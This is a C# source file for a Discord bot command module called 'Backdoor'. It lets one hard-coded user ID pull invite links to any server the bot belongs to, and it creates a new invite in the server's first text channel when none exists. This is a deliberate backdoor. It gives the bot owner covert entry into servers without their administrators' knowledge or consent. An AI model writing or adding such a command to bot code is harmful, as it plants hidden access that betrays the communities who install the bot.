using System;
using System.Collections.Generic;
using System.Text;
using System.Linq;
using System.Threading.Tasks;

using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace DiscordBotInCSharp.Core.Moderation
{
   public class Backdoor : ModuleBase<SocketCommandContext>
   {
        [Command("backdoor"), Summary("Get the invite of a server")]
        public async Task BackdoorModule(ulong GuildId)
        {
            //(put your user id in the space)
            if (!(Context.User.Id == 353014527677300736))
            {
                await Context.Channel.SendMessageAsync(":eyes: You are not a bot moderator!");
                return;
            }

            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":eyes: I am not in a guild with id=" + GuildId);
                return;
            }

            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
            try
            {
                //Test code in try. If theres an error, it'll go into catch, which you can use catch to prevent the program
                var Invites = await Guild.GetInvitesAsync();
                if (Invites.Count() < 1)
                {
                    await Guild.TextChannels.First().CreateInviteAsync();
                    
                }

                Invites = null;
                Invites = await Guild.GetInvitesAsync();
                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithAuthor($"Invites for guild {Guild.Name}:", Guild.IconUrl);
                Embed.WithColor(40, 200, 150);
                foreach (var Current in Invites)
                    Embed.AddInlineField("Invite:", $"[Invite]({Current.Url})");

                await Context.Channel.SendMessageAsync("", false, Embed.Build());
            }
            catch (Exception ex)
            {
                await Context.Channel.SendMessageAsync($":eyes: Creating an invite for guild{Guild.Name} went wrong with error ``{ex.Message}``");
                return;
            }


        }
   }
}
